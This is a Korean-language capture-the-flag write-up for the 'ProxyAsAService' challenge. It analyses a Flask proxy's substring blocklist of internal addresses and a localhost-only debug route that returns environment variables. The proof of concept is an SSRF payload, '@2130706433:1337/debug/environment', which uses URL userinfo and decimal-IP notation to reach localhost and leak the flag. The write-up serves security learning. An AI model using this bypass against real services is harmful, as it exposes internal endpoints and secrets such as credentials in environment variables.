# ProxyAsAService
- localhost:1337 로 접근해야 풀리는 문제

# Source Code Analysis
```
from flask import Blueprint, request, Response, jsonify, redirect, url_for
from application.util import is_from_localhost, proxy_req
import random
import os

SITE_NAME = 'reddit.com'

proxy_api = Blueprint('proxy_api', __name__)
debug = Blueprint('debug', __name__)

@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')
    if not url:
        cat_meme_subreddits = [
            '/r/cats/',
            '/r/catpictures/',
            '/r/catvideos/',
        ]
        random_subreddit = random.choice(cat_meme_subreddits)
        return redirect(url_for('.proxy', url=random_subreddit))

    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)
    return Response(response.content, response.status_code, headers.items())


@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
    environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers),
    }
    return jsonify(environment_info)

```
- ```routes.py```의 내용을 보니 ```/debug/environment```에 GET 요청을 할 경우 ```os.environ```을 통해 환경변수를 리턴

```
from flask import request, abort
import functools
import requests

RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']


def is_safe_url(url: str) -> bool:
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:
            return False
    return True


def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip


def proxy_req(url: str):
    method = request.method
    headers = {
        key: value
        for key, value in request.headers
        if key.lower() in ['x-csrf-token', 'cookie', 'referer']
    }
    data = request.get_data()

    # 대상 URL 검사
    if not is_safe_url(url):
        return abort(403)

    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        verify=False
    )

    # 리다이렉트된 URL 검사
    if not is_safe_url(response.url):
        return abort(403)

    return response, headers
```
- 미들웨어 함수의 내용은 위와 같다.
- 블랙리스트 ```RESTRICTED_URLS```를 우회해서 ```/debug/environment```에 로컬 호스트 아이피:1337로 접속하는 것이 목표다.

- 이때 ```SITE_NAME```이 상수로 지정되어 있고, ```target_url = f'http://{SITE_NAME}{url}``` 와 같이 사용된다.
- ```http://<SITE_NAME>@localhost:1337/debug/environment```와 같이 사용자 이름으로 인식되도록 하면 될 것 같다.

## PoC
- URL Format Bypass 기법을 활용하여 블랙리스트 우회
```
@2130706433:1337/debug/environment
```
![image](https://github.com/user-attachments/assets/3a3f1ab3-e841-41dc-bb5d-1a4e488f3e2f)
- 플래그 획득

